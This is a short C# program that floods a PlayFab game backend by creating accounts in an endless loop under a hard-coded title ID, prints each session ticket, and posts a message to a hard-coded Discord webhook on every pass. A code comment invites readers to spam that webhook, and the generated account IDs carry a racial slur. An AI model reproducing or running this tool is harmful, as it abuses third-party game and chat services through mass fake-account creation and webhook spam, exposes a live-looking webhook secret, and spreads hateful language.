using PlayFab;
using PlayFab.ClientModels;
using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

class Program
{
    static async Task Main()
    {
        PlayFabSettings.TitleId = "A126s";
        string webhook = "https://discord.com/api/webhooks/1467480545360347280/ir-6D39z8rCvBUdLYJ03lv0q_Q3uijHCeJCpt8kl51R_fYCklJwjPt7aQzR0iCAwbQcF"; // u can try to spam it


        int count = 0;
        var cts = new CancellationTokenSource();

        _ = Task.Run(() => { Console.ReadKey(true); cts.Cancel(); });

        while (!cts.IsCancellationRequested)
        {
            count++;

            var request = new LoginWithCustomIDRequest
            {
                CustomId = "STOP_SKIDDING_NIGGER" + Guid.NewGuid().ToString("N")[..12],
                CreateAccount = true
            };

            try
            {
                var result = await PlayFabClientAPI.LoginWithCustomIDAsync(request);

                if (result.Error == null)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[{count,6}] SUCCESS → {result.Result.PlayFabId} SESSION TICKET {result.Result.SessionTicket}");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[{count,6}] FAILED  → {result.Error.ErrorMessage}");
                    Console.ResetColor();
                }
            }
            catch
            {
                Console.WriteLine($"[{count,6}] EXCEPTION");
            }
            using (HttpClient client = new HttpClient())
            {
                var payload = new
                {
                    content = $"PlayFab ID = {PlayFabSettings.TitleId}"
                };

                string json = JsonSerializer.Serialize(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                HttpResponseMessage response = await client.PostAsync(webhook, content);

                Console.WriteLine(response.IsSuccessStatusCode
                    ? "Message sent!"
                    : $"Failed: {response.StatusCode}");
            }


            if (count >= 5)
                await Task.Delay(5000, cts.Token);
            
        }

        Console.WriteLine($"\n\nSTOPPED. Total accounts attempted: {count}");
        Console.WriteLine("Press any key to exit...");
        Console.ReadKey();
    }
}








